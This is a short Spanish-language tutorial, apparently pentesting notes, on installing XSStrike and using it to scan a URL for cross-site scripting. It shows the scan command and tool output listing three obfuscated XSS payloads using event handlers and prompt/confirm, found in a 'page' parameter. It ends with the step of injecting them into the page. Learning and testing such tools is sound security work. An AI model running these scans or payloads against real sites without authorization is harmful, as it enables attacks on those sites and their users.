# XSStrike Herramienta

Es una herramienta que te automatiza la explotacion de la vulnerabilidad `XSS` todo mediante terminal.

Esta herramienta y sus opciones las podremos ver en el repositorio oficial de la herramienta, que estara en el siguiente link:

URL = [XSStrike GitHub](https://github.com/s0md3v/XSStrike)

Para instalar la herramienta, antes instalaremos una cosa que tendremos que utilizar:

```shell
sudo apt-get install python3-pip
```

Ahora vamos a clonar este repositorio a nuestro `kali`.

```shell
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike/
```

```shell
pip3 install -r requirements.txt
```

Una vez echo todo esto, ya podremos utilizarla, por lo que copiaremos una URL que creamos que puede ser vulnerable a `XSS` y se la pasaremos a dicha herramienta de la siguiente forma:

```shell
sudo python3 xsstrike.py -u "URL_Vuln" --timeout 50
```

Info:

```
	XSStrike v3.1.5

/home/dise0/Desktop/XSStrike/core/dom.py:27: SyntaxWarning: invalid escape sequence '\$'
  controlledVariables.add(re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]+', part).group().replace('$', '\$'))
/home/dise0/Desktop/XSStrike/core/dom.py:36: SyntaxWarning: invalid escape sequence '\$'
  controlledVariables.add(re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]+', part).group().replace('$', '\$'))
[~] Checking for DOM vulnerabilities 
[+] Potentially vulnerable objects found 
------------------------------------------------------------
------------------------------------------------------------ailed-td").innerHTML=lMessage;
[+] WAF Status: Offline 
[!] Testing parameter: page 
[!] Reflections found: 5 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 15456 
------------------------------------------------------------
[+] Payload: <HTml%09oNmOusEovER%0a=%0a(prompt)``> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <a%09onmOUSEOVEr%0a=%0aconfirm()%0dx>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <a/+/ONPOiNteREnTEr%0a=%0aa=prompt,a()>v3dm0s 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] n
```

De primeras nos indica que si es vulnerable a `XSS` y que el parametro en concreto seria el `page`, por lo que nos genera un `payload` y nos pregunta si queremos generar otro.

Si le damos a `y` podremos estar generando `payloads` y nos va diciendo el porcentaje que tiene de que funcione mas la confianza del mismo.

Y con estos `payloads` los injectamos en la pagina.
